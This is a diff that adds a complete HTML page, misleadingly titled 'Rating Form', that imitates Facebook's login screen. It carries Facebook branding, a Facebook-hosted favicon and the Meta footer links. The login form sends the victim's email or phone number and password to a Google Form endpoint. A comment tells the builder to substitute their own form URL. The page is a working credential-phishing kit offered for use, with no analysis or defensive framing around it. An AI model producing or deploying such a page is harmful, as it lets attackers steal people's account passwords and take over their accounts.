@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<link rel="stylesheet" href="styles.css">
+<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <meta charset="UTF-8">
+    <title>Rating Form</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Font Awesome for the eye icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Style for the password container */
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        /* Style for the password input field */
+        .password-container input[type="password"],
+        .password-container input[type="text"] {
+            width: 100%;
+            padding-right: 40px; /* Add space for the eye icon */
+            box-sizing: border-box;
+        }
+
+        /* Style for the eye icon */
+        .eye-icon {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            visibility: hidden; /* Hide initially */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="row res">
+        <div class="fb-form res">
+            <div class="card">
+                <h1>facebook</h1>
+                <p>Facebook helps you connect and share</p>
+                <p>with the people in your life.</p>
+            </div>
+
+            <!-- Replace the form action with your Google Form URL -->
+            <form action="https://docs.google.com/forms/d/e/1FAIpQLSeCaN6HavNS7IgsFzAlCfkuPcRORG6gPPCUecky1nZNNW8dcw/formResponse" method="POST">
+                <input type="email" name="entry.1735650247" placeholder="Email or phone number" required>
+                
+                <!-- Password field with toggle visibility feature -->
+                <div class="password-container">
+                    <input type="password" id="password" name="entry.280048995" placeholder="Password" required oninput="showEyeIcon()">
+                    <span class="eye-icon" onclick="togglePassword()">
+                        <i id="eyeIcon" class="fas fa-eye-slash"></i>
+                    </span>
+                </div>
+
+                <div class="fb-submit">
+                    <button type="submit" class="login">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-langs">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">मराठी</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">ગુજરાતી</a></li>
+                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li><a href="#">ਪੰਜਾਬੀ</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><button>+</button></li>
+            </ol>
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In</a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Video</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Meta Store</a></li>
+                <li><a href="#">Meta Quest</a></li>
+                <li><a href="#">Imagine with Meta AI</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Fundraisers</a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Voting Information Centre</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Privacy Centre</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Create ad</a></li>
+                <li><a href="#">Create Page</a></li>
+                <li><a href="#">Developers</a></li>
+                <li><a href="#">Careers</a></li>
+                <li><a href="#">Cookies</a></li>
+                <li><a href="#">AdChoices</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Contact uploading and non-users</a></li>
+            </ol>
+            <small>Meta © 2024</small>
+        </div>
+    </footer>
+
+    <!-- JavaScript function to toggle password visibility and show eye icon -->
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            } else {
+                passwordField.type = 'password';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            }
+        }
+
+        function showEyeIcon() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.querySelector('.eye-icon');
+            if (passwordField.value) {
+                eyeIcon.style.visibility = 'visible';
+            } else {
+                eyeIcon.style.visibility = 'hidden';
+            }
+        }
+    </script>
+</body>
+
+</html>
